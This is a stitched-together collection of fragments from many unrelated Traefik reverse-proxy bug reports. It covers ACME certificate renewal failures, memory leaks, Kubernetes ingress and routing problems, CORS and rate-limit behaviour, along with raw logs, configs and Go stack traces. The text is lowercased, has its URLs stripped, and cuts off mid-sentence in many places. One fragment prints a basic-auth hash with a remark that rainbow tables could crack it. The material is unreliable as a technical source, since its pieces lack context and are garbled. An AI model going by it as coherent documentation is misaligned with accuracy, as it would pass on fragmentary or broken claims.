time="2019-07-29t06:57:44z" level=error msg="error renewing certificate from le: {*.sub.domain.com []}, acme: error -> one or more domains had a problem:\ [*.sub.domain.com] [*.sub.domain.com] acme: error presenting token: otc: unable to get zone: get net/http: request canceled (client.timeout exceeded while awaiting headers)\ "
``` ### suggestion as this problem has already been addressed in acme-lego ( i would appreciate an upgrade to version v2.7.1
traefik both ignores the aforementioned annotation and looks at the wrong port to decide whether it sees 443; it looks at the _endpoints_ object's ports, which are the target pod's ports, and not the ports used by the _service_ sitting in front of those pods.
only an http router was created.
memory not decrease, but stay same
high memory load
requests to come back with "_cache-control: no-cache_" response header.
the temporary files exist forever.
this error: ``` ----------------------------------------------------------------------
fail: https_test.go:333: httpssuite.testwithclientcertificateauthenticationmultipecas https_test.go:352: c.assert(err, checker.notnil, check.commentf("should not be allowed to connect to server"))
value = nil
should not be allowed to connect to server ----------------------------------------------------------------------
miss: https_test.go:395: httpssuite.testwithclientcertificateauthenticationmultipecasmultiplefiles
oops: 0 passed, 1 failed, 1 missed
--- fail: test (0.22s)
exit status 1
fail github.com/containous/traefik/integration 0.251s
make: *** [makefile:75: test-integration] error 1
traefik didn't load correctly and when checking its logs i got: `command traefik error: failed to decode configuration from flags: field not found, node: trace`
messages truncated to 4kb
traefik forwarding this header to backend without modification
### output of `traefik version`: 1.7.12 ``` ```
a certificate is linked with the wrong subdomain in consul, leading to the wrong certificated served by traefik for that domain.
after acme issues a cert, all instances of traefik should use the cert
however, some instances don't have the cert, which i can see by making a request against the specific instance: ```shell
$ curl -vs --connect-to ::10.4.10.170:8443 >/dev/null
* connecting to hostname: 10.4.10.170
* connecting to port: 8443
* trying 10.4.10.170...
* tcp_nodelay set
* connected to 10.4.10.170 (10.4.10.170) port 8443 (#0)
* alpn, offering h2
* alpn, offering http/1.1
* successfully set certificate verify locations:
* cafile: /etc/ssl/certs/ca-certificates.crt capath: none
* tlsv1.2 (out), tls handshake, client hello (1):
} [234 bytes data]
* tlsv1.2 (in), tls handshake, server hello (2):
{ [58 bytes data]
* tlsv1.2 (in), tls handshake, certificate (11):
{ [853 bytes data]
* tlsv1.2 (out), tls alert, unknown ca (560):
} [2 bytes data]
* ssl certificate problem: unable to get local issuer certificate
* closing connection 0
``` debugging this with `openssl s_client`, traefik is serving the default cert (`subject=/cn=traefik default cert`)
dumping the acme state from etcd shows me that the domain is there: ```json
{ "email": "...", "registration": { "body": { "status": "valid", "contact": [ "mailto:..." ] }, "uri": "..." }, "privatekey": "...", "keytype": "4096", "domainscertificate": { "certs": [ ..., { "domains": { "main": "a4.test.t11e.com", "sans": null }, "certificate": { "domain": "a4.test.t11e.com", "certurl": "...", "certstableurl": "...", "privatekey": "...", "certificate": "..." } } ] }, "challengecerts": {}, "httpchallenge": { ..
``` i can reproduce this consistently in our staging environment by adding new hosts to our config
everything else is working fine, it's just that we have to reload traefik pods every time we do an ingress change.
crashed / hanging traefik, needed redeployment before working again.
an error page which gave the impression i had done something wrong
chrome 75 page output: > this site can be reached
> > the webpage at might be temporarily down or it may have moved permanently to a new web address.
> > err_ssl_key_usage_incompatible
traefik should route traffic to service por t80.
http basic credentials dialog is repeatedly shown, no access is granted ever.
error results are dominated by dynamic cert management platforms like traefik and jetstack/cert-manager.
traefik | 2019/06/20 13:22:05 command /traefik error: entrypoints cannot be a standalone element (type static.entrypoints)
traefik reply on requests like
origin:
access-control-request-method: post
access-control-request-headers: content-type
http/1.1 200 ok
access-control-max-age: 0
content-length: 0
date: tue, 18 jun 2019 20:11:56 gmt
if request doesn't have `access-control-request-headers:` header then request is forwarded to backend service, as it should be.
```390 +pong```
(ping responded with pong for 30-50% of requests)
$ curl -u "user:password"
{"docker":{"backends":{"backend-lb-api-auth-docker":{"servers":{"server-api-auth-lb-1-e42dd141b28258fda36b39d92119a422":{"url":" ","weight":1}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-docker-lb-api-auth-docker":{"entrypoints":["http"],"backend":"backend-lb-api-auth-docker","routes":{"route-frontend-docker-lb-api-auth-docker":{"rule":"host:localhost"}},"passhostheader":true,"priority":0,"basicauth":null,"auth":{"basic":{"users":["user:$apr1$hfjubfem$zdbkjk872vzblxv5diqpd0"]}}}}}}
=> so i can totally use a rainbow table to de-hash the password until 14 characters easily (more is challenging as for today), even if there is a salt in the basic auth.
an error message: `level=error msg="provider connection error error response from daemon: client version 1.21 i
minimum supported api version is 1.24, please upgrade your client to a newer version, retrying in 3.093711959
s" providername=docker`
- testing tcp route with raw telnet connection shows that mta's banner is **not** presented
ehlo <identifier> request responds with
``` 250 domain.tld 250 starttls
- testing tcp route with openssl client starttls connection (openssl s_client -connect mail.domain.tld:25 -starttls smtp) reponds with: ```
connected(00000003)
``` no further output - connection is stuck
traefik failed to connect to mesos
reason is mesos removed at some time (don't know in which release) the .json endpoints ( master/state.json endpoint in your case) , replacing them with **/state (cf
memory leak
after some time it does not work (see logs)
it's not possible because the name of the middleware is prefixed with namespace
setting the namespace attribute to empty string doesn't work either.
ingressroute can't find the redirectscheme
output of /api/rawdata
{ "middlewares": { "ingress/https-only": {} }
traefik_backend_server_up 1 for all (even unhealthy) backends ### output of `traefik version`: 1.7.9
traefik is not consistently using the same instance to solve the challenge(s) ### version ```
version: v1.7.11
codename: maroilles
go version: go1.11.9
built: 2019-04-26_08:42:33am
os/arch: linux/amd64
``` ### configuration ```toml
debug = false
checknewversion = false
keeptrailingslash = true
loglevel = "info"
defaultentrypoints = ["http", "https"] [traefiklog]
format = "json" [accesslog]
format = "json" [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.forwardedheaders] trustedips = ["127.0.0.1/32", "192.168.0.0/16", "127.16.0.0/12", "10.0.0.0/8", "130.211.0.0/22", "35.191.0.0/16"] [entrypoints.https] address = ":443" compress = true [entrypoints.https.forwardedheaders] trustedips = ["127.0.0.1/32", "192.168.0.0/16", "127.16.0.0/12", "10.0.0.0/8", "130.211.0.0/22", "35.191.0.0/16"] [entrypoints.https.tls] minversion = "versiontls11" ciphersuites = [ "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha256", "tls_ecdhe_rsa_with_aes_128_cbc_sha256", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha", "tls_ecdhe_ecdsa_with_aes_256_cbc_sha", "tls_ecdhe_rsa_with_aes_256_cbc_sha", "tls_ecdhe_rsa_with_aes_128_cbc_sha" ] [kubernetes] [api] [etcd]
watch = true
endpoint = "etcd:2379"
prefix = "/traefik"
useapiv3 = true [acme]
email = "xxx@xxx.com"
storage = "traefik/acme/account"
entrypoint = "https"
onhostrule = true
acmelogging = true [acme.httpchallenge] entrypoint = "http"
``` ### relevant log output success:
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [domain.tld] acme: obtaining bundled san certificate","time":"2019-05-07t08:32:00z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [domain.tld] authurl: ","time":"2019-05-07t08:32:01z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [domain.tld] acme: could not find solver for: tls-alpn-01","time":"2019-05-07t08:32:01z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [domain.tld] acme: use http-01 solver","time":"2019-05-07t08:32:01z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [domain.tld] acme: trying to solve http-01","time":"2019-05-07t08:32:01z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [domain.tld] the server validated our request","time":"2019-05-07t08:32:08z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [domain.tld] acme: validations succeeded; requesting certificates","time":"2019-05-07t08:32:08z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [domain.tld] server responded with a certificate.","time":"2019-05-07t08:32:11z"}
traefik-vjx72 traefik {"level":"error","msg":"datastore sync error: object lock value: expected 5f511b6b-4c15-479a-9e39-6c03465ebcde, got 5479c7f0-ad68-4dbf-be56-269d08a6d26c, retrying in 380.160476ms","time":"2019-05-07t08:32:11z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [anotherdomain.tld] acme: obtaining bundled san certificate","time":"2019-05-07t08:33:53z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [anotherdomain.tld] authurl: ","time":"2019-05-07t08:33:54z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [anotherdomain.tld] acme: could not find solver for: tls-alpn-01","time":"2019-05-07t08:33:54z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [anotherdomain.tld] acme: use http-01 solver","time":"2019-05-07t08:33:54z"}
traefik-vjx72 traefik {"level":"info","msg":"legolog: [info] [anotherdomain.tld] acme: trying to solve http-01","time":"2019-05-07t08:33:54z"}
traefik-vjx72 traefik {"level":"error","msg":"datastore sync error: object lock value: expected 1f84a220-089e-4854-87e2-f9006a6ca4fb, got 713f4e2f-6065-4c22-b3b3-656fba7e7b57, retrying in 603.006298ms","time":"2019-05-07t08:33:54z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 355.982358ms","time":"2019-05-07t08:33:56z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 530.613849ms","time":"2019-05-07t08:33:56z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 1.43469375s","time":"2019-05-07t08:33:57z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 1.881825721s","time":"2019-05-07t08:33:58z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 1.528207478s","time":"2019-05-07t08:34:00z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 1.924772981s","time":"2019-05-07t08:34:02z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 5.214508065s","time":"2019-05-07t08:34:04z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 6.400310981s","time":"2019-05-07t08:34:09z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 9.171718661s","time":"2019-05-07t08:34:15z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 14.096826394s","time":"2019-05-07t08:34:24z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token retrying in 20.817540857s","time":"2019-05-07t08:34:38z"}
traefik-pcxcv traefik {"level":"error","msg":"error getting challenge for token: cannot find challenge for token z0paudqxql7_ug27h5x_glyynawq8uus3gfvb7kp25u","time":"2019-05-07t08:34:59z"}
`sec-websocket-extensions` header is not forwarded to the client.
time="2019-05-03t12:40:15z" level=error msg="unable to obtain acme certificate for domains \\"subdomain.example.com\\" detected thanks to rule \\"host:subdomain.example.com\\" : unable to generate a certificate for the domains [subdomain.example.com]: acme: error -> one or more domains had a problem:\ [subdomain.example.com] [subdomain.example.com] acme: error presenting token: cloudflare: failed to find zone example.com.: listzones command failed: error from makerequest: http request failed: get net/http: invalid header field value \\"xxxxxxxxxxxxxxxxxxxx\\\ \\" for key x-auth-key\ "
time="2019-05-01t16:33:50z" level=debug msg="error calling
cause: get x509: certificate is valid for ffe823de1a97908301ae47d48a08dc4a.64aa04c912381e9780ad2cda057623f6.traefik.default, not login.internal.local.mydomain.com"
access-control-allow-origin header with origin value
the internal webdav server (apache 2.4) responds with `502 bad gateway`.
![ss+(2019-04-19+at+07 35 20)](
still all cipher suites are supported.
traefik | time="2019-04-15t17:01:53z" level=info msg="legolog: [info] [*.domain.com] acme: cleaning dns-01 challenge"
traefik | time="2019-04-15t17:01:54z" level=info msg="legolog: [warn] [*.domain.com] acme: error cleaning up: cloudns: txt record unmarshaling error: json: cannot unmarshal array into go value of type internal.txtrecords "
traefik | time="2019-04-15t17:01:54z" level=error msg="error obtaining certificate retrying in 618.499901ms"
``` i also monitored the dashboard in cloudns.net while traefik was trying to update the dns records
during this time the domain did not get updated
there was no change in the dns records what so ever.
unfortunately every time traefik loads the data from dynamodb the ram consumption increases very much
we confirmed that this update procedure is causing the increase by modifying the config parameter `refreshseconds` for the dynamodb provider
eventually the machine runs out of free memory and becomes unresponsive
#### refresh time is 1h
![1h]( #### refresh time is 5min
![5min]( as one can see in the second graph, sometimes traefik itself crashes due to a lack of memory even before the instance is killed by aws
for log snippets see below.
traefik added a content-type: text to the header
(404)
level=warning msg="tcp router ignored, cannot specify a host rule without tls" entrypointname=web routername=docker.something
level=error msg="\ you haven\'t specify the sendanonymoususage option, it will be enable by default.\ "
level=info msg="\ stats collection is enabled.\ many thanks for contributing to traefik\'s improvement by allowing us to receive anonymous information from your configuration.\ help us improve traefik by leaving this feature on :)\ more details on: #collected-data\ "
time="2019-03-21t18:28:46z" level=error msg="error while peeking first byte: eof"
time="2019-03-21t18:28:48z" level=error msg="error while peeking first byte: eof"
time="2019-03-21t18:28:56z" level=error msg="error while peeking first byte: eof"
time="2019-03-21t18:28:58z" level=error msg="error while peeking first byte: eof"
a 15 digit spanid
`"request_x-b3-spanid":"3b7e31b3c6e4b4b"`
level=info msg="creating cluster-external provider client"
level=error msg="error starting provider *kubernetes.provider: endpoint missing for external cluster client"
``` and the pod starts responding with http 404 on all requests
according to traefik docs ( #endpoint), it will try to use external-cluster client if env variables are not there
however, regardless of it is successful or not, the pod starts
from kubernetes api logs, i also notice that traefik actually starts about 10 seconds before the kube-proxy application on the node is ready
it is quite hard to recreate as it does not always happen
seems to happen during "rapid" upscaling (increase on cpu usage, scaling several nodes at the same time) - high pressure on the nodes
resolved by killing the treafik pod (it starts normally when we kill it).
only the header x-forwarded-for
providers.file is shown with a default value of true, but in fact, it's false
as i mentioned, whatever i do in the configmap or at the ingress level doesn't affect the actual behaviour
i have a sense it's been cached somewhere
also, the annotations i implement are not reflected in the traefik dashboard for the selected frontend (i expect to see color labels at least which indicate the rules applied).
i\'ve got this: <img width="1680" alt="screen shot 2019-03-16 at 3 50 44 pm" src=" ">
all requests are logged.
when i use some random name for the <name> placeholder the traefik service does not start up with 500 config error in logs
without the <name> part traefik does start
when used as service deploy labels the labels are part of **.spec.labels** when inspecting the service, but the container does not show them
when used as service labels they show up in **.tasktemplate.containerspec.labels** when inspecting the service, and they show up in **.config.labels** on the task container the service creates
in both cases the rate limit does not work when i test it with apache benchmark
set rate limit to average=100, burst=200,period=10s, and got ~600 #/sec when doing benchmark
is ratelimits via service labels in a docker stack supported? do i use the right syntax? why does the ratelimit not apply to the service?
time="2019-03-11t10:01:10z" level=error msg="unable to obtain acme certificate for domains \\"*.xxxx.is,xxxx.is\\" : unable to generate a certificate for the domains [*.xxxx.is xxxx.is]: acme: error -> one or more domains had a problem:\ [*.xxxx.is] [*.xxxx.is] acme: error presenting token: cloudflare: failed to find zone is.: zone could not be found\ [xxxx.is] [xxxx.is] acme: error presenting token: cloudflare: failed to find zone is.: zone could not be found\ "
the following error message: serviceunavailable: websocket connection failure
due to security constraints in your web browser, the reason for the failure is not available to this neo4j driver
please use your browsers development console to determine the root cause of ...
i got the loadbalancer ip address resolve instead of the client ip address
the loadbalancer is passing the correct header, as stated here ```
time="2019-02-28t08:49:02z" level=debug msg="request &{method:get url:/ proto:http/1.1 protomajor:1 protominor:1 header:map[upgrade-insecure-requests:[1] user-agent:[mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/72.0.3626.119 safari/537.36] dnt:[1] accept-encoding:[gzip, deflate, br] x-forwarded-prefix:[/<my-path>] connection:[keep-alive] cache-control:[max-age=0] authorization:[basic ywrtaw46ywrtaw4=] accept:[text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8] accept-language:[en-us,en;q=0.9,it;q=0.8]] body:{} getbody:<nil> contentlength:0 transferencoding:[] close:false host:10.29.5.13 form:map[] postform:map[] multipartform:<nil> trailer:map[] remoteaddr:<load-balancer-ip>:50846 requesturi:/ tls:<nil> cancel:<nil> response:<nil> ctx: } - rejecting: \\"<load-balancer-ip>:50846\\" matched none of the white list
the addprefix rule was not passed into traefik, so the frontend routing did not add the prefix.
timeout parameter is ignored
all paths seem have a `403` unauthorized code but only when using a domain name and not when using a lan address
traffic is only routed to the service that has more than 50% as weight
no traffic is routed to the other one
if put 50% on each service, traffic is routed to both services.
i can see on the dashboard that weights are well configured.
``` server | weight
| 10000
| 10000
| 10000
| 23333
| 23333
| 23333
``` i tested also with one replicas for each service and i don't have the issue (weights are ok).
500 internal server error, even the downstream backend didn't show anything
it seems as if- with sans no longer being configured- traefik was sometimes serving the meanwhile expired and non-renewed san certificate
at any rate i would expect the behaviour of choosing the certficate to serve to be deterministic
some more guard against misconfiguration might be good.
- very high memory usage (450mb) until the memory limit of the cgroup was reached and traefik got killed by the oom killer
global-default-backend shows red and no services attached.
incomplete _packet_ transport with websocket
but traefik is confused with these two rules, and route traffic from 8080 and 9090 to service1 and service2 randomly! i expect traefik do not merge two ingresses have different entrypoints
after some digging, i found that when traefik load ingress from kubernetes , it use `basename := r.host + pa.path` as key
i think it should be `key = host + entrypoint + path` #l190
./build/install/examples/bin/hello-world-client
jan 26, 2019 11:19:11 pm io.grpc.examples.helloworld.helloworldclient greet
info: will try to greet world ...
jan 26, 2019 11:19:11 pm io.grpc.examples.helloworld.helloworldclient greet
warning: rpc failed: status{code=internal, description=received unexpected eos on data frame from server., cause=null}
``` * server logs show normal/successful operation.
get / http/1.1
host: myhost
response : ```
http/1.1 200 the web server behind ```
no frontend or backend discovered at all
a failed renewal when the only configuration value i'm changing is which le endpoint to go to.
the traefik container shows these error messages: ```
time="2019-01-20t19:52:41z" level=error msg="failed to retrieve information of the docker client and server host: error during connect: get open //./pipe/docker_engine: message readmode pipes not supported in the default daemon configuration on windows, the docker client must be run elevated to connect
this error may also indicate that the docker daemon is not running."
time="2019-01-20t19:52:41z" level=error msg="provider connection error get open //./pipe/docker_engine: message readmode pipes not supported in the default daemon configuration on windows, the docker client must be run elevated to connect
this error may also indicate that the docker daemon is not running.
github.com/containous/traefik/vendor/github.com/docker/docker/client.(*client).dorequest /go/src/github.com/containous/traefik/vendor/github.com/docker/docker/client/request.go:182
github.com/containous/traefik/vendor/github.com/docker/docker/client.(*client).sendrequest /go/src/github.com/containous/traefik/vendor/github.com/docker/docker/client/request.go:122
github.com/containous/traefik/vendor/github.com/docker/docker/client.(*client).get /go/src/github.com/containous/traefik/vendor/github.com/docker/docker/client/request.go:37
github.com/containous/traefik/vendor/github.com/docker/docker/client.(*client).serverversion /go/src/github.com/containous/traefik/vendor/github.com/docker/docker/client/version.go:12
github.com/containous/traefik/provider/docker.(*provider).provide.func1.1 /go/src/github.com/containous/traefik/provider/docker/docker.go:137
github.com/containous/traefik/safe.operationwithrecover.func1 /go/src/github.com/containous/traefik/safe/routine.go:160
github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37
github.com/containous/traefik/provider/docker.(*provider).provide.func1 /go/src/github.com/containous/traefik/provider/docker/docker.go:252
github.com/containous/traefik/safe.(*pool).goctx.func1 /go/src/github.com/containous/traefik/safe/routine.go:62
github.com/containous/traefik/safe.gowithrecover.func1 /go/src/github.com/containous/traefik/safe/routine.go:142
runtime.goexit /usr/local/go/src/runtime/asm_amd64.s:1333
error during connect
github.com/containous/traefik/vendor/github.com/docker/docker/client.(*client).dorequest /go/src/github.com/containous/traefik/vendor/github.com/docker/docker/client/request.go:185
github.com/containous/traefik/vendor/github.com/docker/docker/client.(*client).sendrequest /go/src/github.com/containous/traefik/vendor/github.com/docker/docker/client/request.go:122
github.com/containous/traefik/vendor/github.com/docker/docker/client.(*client).get /go/src/github.com/containous/traefik/vendor/github.com/docker/docker/client/request.go:37
github.com/containous/traefik/vendor/github.com/docker/docker/client.(*client).serverversion /go/src/github.com/containous/traefik/vendor/github.com/docker/docker/client/version.go:12
github.com/containous/traefik/provider/docker.(*provider).provide.func1.1 /go/src/github.com/containous/traefik/provider/docker/docker.go:137
github.com/containous/traefik/safe.operationwithrecover.func1 /go/src/github.com/containous/traefik/safe/routine.go:160
github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37
github.com/containous/traefik/provider/docker.(*provider).provide.func1 /go/src/github.com/containous/traefik/provider/docker/docker.go:252
github.com/containous/traefik/safe.(*pool).goctx.func1 /go/src/github.com/containous/traefik/safe/routine.go:62
github.com/containous/traefik/safe.gowithrecover.func1 /go/src/github.com/containous/traefik/safe/routine.go:142
runtime.goexit /usr/local/go/src/runtime/asm_amd64.s:1333, retrying in 10.780695475s"
``` request url is processed fine, the backend generates a redirect which contains unmatched path
the redirect location wasn't modified in <1.6.5 but in 1.6.5+ the redirect location is changed to the traefik host + path ### work around? (kudos to @quirogadf) define a front end to match the expected redirect path, pass to backend without altering the path rules.toml
```toml [frontends.dev] backend = "dr" [frontends.dev.routes.test_1] rule = "pathprefixstrip:/hdp/dev/kx;addprefix:/gateway/testdev1" [frontends.dev2] backend = "dr" [frontends.dev2.routes.test_1] rule = "pathprefix:/gateway/testdev1
``` feel the bug here is a change in how unmatched paths are handled
i connect only to the traefik ui
if the service is on a port other than 80/8080 then it isn't a problem and i can properly see the service (ie if i curl the nodeport 30000 internally on the service i will get the proper service)
for instance, i have node-red on my server (with ingress and a service) running on port 1880
i can successfully access it both inside and outside the cluster with the proper dns entry (node-red.default)
i also checked dns entries and they are pointing to the proper service ip (which then points to the proper pod ip(s)).
level=error msg="error in go routine: open /usr/local/go/lib/time/zoneinfo.zip: no such file or directory
referencing this post: traefik service screen in datadog only shows one resource which appears to be a randomly picked entrypoint
these entrypoints are constructed as following: "entrypoint -scheme- -host-"
the post mentions that the top level name applied for each resource needs to be the same.
i can see cpu usage goes up to 100% when using a browser to download
(tested with latest chrome and firefox on windows 10 x64bit)
this also happens when using "free download manager"
![traefik](
but, if i download using other download managers (tested using idm,flashget,wget in ubuntu,) i get the normal cpu usage which is less than 10%.
this is a very weird issue.
the le wildcard certificates expired with the following error: ```
time="2019-01-09t02:03:43z" level=error msg="error renewing certificate from le: {*.example.com [example.com]}, acme: error -> one or more domains had a problem:\ [*.example.com] [*.example.com] acme: error presenting token: route53: failed to change record set: invalidchangebatch: [rrset with dns name _acme-challenge.example.com
is not permitted in zone example1.com.]\ \\tstatus code: 400, request id: ca7c49f4-13b2-11e9-a48c-adfe188b9f2d\ [example.com] [example.com] acme: error presenting token: route53: failed to change record set: invalidchangebatch: [rrset with dns name _acme-challenge.example.com
is not permitted in zone example1.com.]\ \\tstatus code: 400, request id: ca73e52e-13b2-11e9-8ca3-89b4b24b15bc\ " ```
configuration updates may take up to a minute or longer
### output of `traefik version`: ```
version: v1.7.6
codename: maroilles
go version: go1.11.3
built: 2018-12-14_06:43:37am
os/arch: linux/amd64
* when browsing to ` `, the authentication form is presented to me, as expected.
* after entering valid data in the form, no cookie is returned in the response
the scenario is similar to the feature request #2620, which is closed by its creator with no solution
i suspect this is because the `post` request send to the authentication backend via ` ` is also filtered through the forward authentication process
because i'm not logged in when sending this request, a new request is created by traefik and send to the authentication backend without the `post` data
a solution would be to disable the forward authentication process when the requested url matches that of the authentication backend
with this solution i could login from ` ` (not from ` `, but that's solvable with appropriate redirections)
_note that the authentication process is working correctly when login in with ` `, which sets the cookie correctly._ ### output of `traefik version`: version: v1.7.4
codename: maroilles
go version: go1.11.1
built: 2018-10-30_10:44:30am
os/arch: linux/arm
traefik exposed the service with the ip of the ec2 instance.
only one of the certificate requests succeeds, the rest times out
traefik logs that it is waiting for dns propagation for each container/domain but when i look in the transip dns control panel, i can only see an acme challenge txt record for 1 domain
so the timeouts are not because of problems with dns propagation but because the records are not correctly set in the dns zone
i think the problem is that the transip dns provider in lego only has a `setdnsentries` method that saves an entire dns zone
when traefik tries to request 5 different certificates, it ends up fetching the current zone details and `setdnsentries` in quick succession
i think there is a race condition between getting the zone info and the `setdnsentries` which updates an entire zone where the calls to `setdnsentries` end up overwriting txt records of concurrently running challenges.
- at renewal, either the server specified by rfc2136_nameserver or the network appears to have had issues, resulting in the following: `msg="error renewing certificate from le: {*.mydomain.com [mydomain.com]}, acme: error -> one or more domains had a problem:\ [mydomain.com] error presenting token: rfc2136: dns update failed: read udp [2001:xxxx::1]:52529->[2001:xxxx::2]:53: i/o timeout\ "`
- subsequently, the following message was repeated every day, so it appears to be trying to confirm the dns update that never happened, and failing: `msg="error renewing certificate from le: {*.mydomain.com [mydomain.com]}, acme: error -> one or more domains had a problem:\ [mydomain.com] time limit exceeded: last error: ns ns0.mydomain.com
did not return the expected txt record [fqdn: _acme-challenge.mydomain.com.]\ "` now, my certs are going to expire in a couple of weeks, and i don\'t know how to make traefik retry the dns update so that the renewal can occur.
{"level":"info","msg":"using toml configuration file /config/traefik.toml","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"traefik version v1.7.6 built on 2018-12-14_06:43:37am","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ ","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"preparing server https \\u0026{address::443 tls:\\u003cnil\\u003e redirect:\\u003cnil\\u003e auth:\\u003cnil\\u003e whitelistsourcerange:[] whitelist:\\u003cnil\\u003e compress:true proxyprotocol: forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"enabling proxyprotocol for trusted ips [10.196.0.0/16]","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"preparing server traefik \\u0026{address::8080 tls:\\u003cnil\\u003e redirect:\\u003cnil\\u003e auth:\\u003cnil\\u003e whitelistsourcerange:[] whitelist:\\u003cnil\\u003e compress:false proxyprotocol:\\u003cnil\\u003e forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"preparing server http \\u0026{address::80 tls:\\u003cnil\\u003e redirect: auth:\\u003cnil\\u003e whitelistsourcerange:[] whitelist:\\u003cnil\\u003e compress:true proxyprotocol: forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"enabling proxyprotocol for trusted ips [10.196.0.0/16]","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"starting provider configuration.provideraggregator {}","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"starting server on :443","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"starting server on :8080","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"starting server on :80","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":[\\"kube-system\\",\\"routing-rules\\",\\"devops\\"],\\"labelselector\\":\\"traffic-type=vpn\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":{\\"ip\\":\\"\\",\\"hostname\\":\\"\\",\\"publishedservice\\":\\"routing/router-vpn-traefik\\"}}","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"ingress label selector is: \\"traffic-type=vpn\\"","time":"2018-12-18t21:11:43z"}
{"level":"info","msg":"creating in-cluster provider client","time":"2018-12-18t21:11:43z"}
{"level":"error","msg":"error in go routine: runtime error: invalid memory address or nil pointer dereference","time":"2018-12-18t21:11:44z"}
{"level":"error","msg":"stack: goroutine 37 [running]:\ runtime/debug.stack( , , )\ \\t/usr/local/go/src/runtime/debug/stack.go:24 + \ github.com/containous/traefik/safe.defaultrecovergoroutine( , )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:148 + \ github.com/containous/traefik/safe.operationwithrecover.func1.1( )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:156 + \ panic( , )\ \\t/usr/local/go/src/runtime/panic.go:513 + \ github.com/containous/traefik/provider/kubernetes.(*clientimpl).getservice( , , , , , , , , )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/client.go:198 + \ github.com/containous/traefik/provider/kubernetes.(*provider).updateingressstatus( , , , , , )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:442 + \ github.com/containous/traefik/provider/kubernetes.(*provider).loadingresses( , , , , , )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:414 + \ github.com/containous/traefik/provider/kubernetes.(*provider).provide.func1.1( , )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:145 + \ github.com/containous/traefik/safe.operationwithrecover.func1( , )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:160 + \ github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 + \ github.com/containous/traefik/provider/kubernetes.(*provider).provide.func1( )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:165 + \ github.com/containous/traefik/safe.(*pool).go.func1()\ \\t/go/src/github.com/containous/traefik/safe/routine.go:78 + \ github.com/containous/traefik/safe.gowithrecover.func1( , )\ 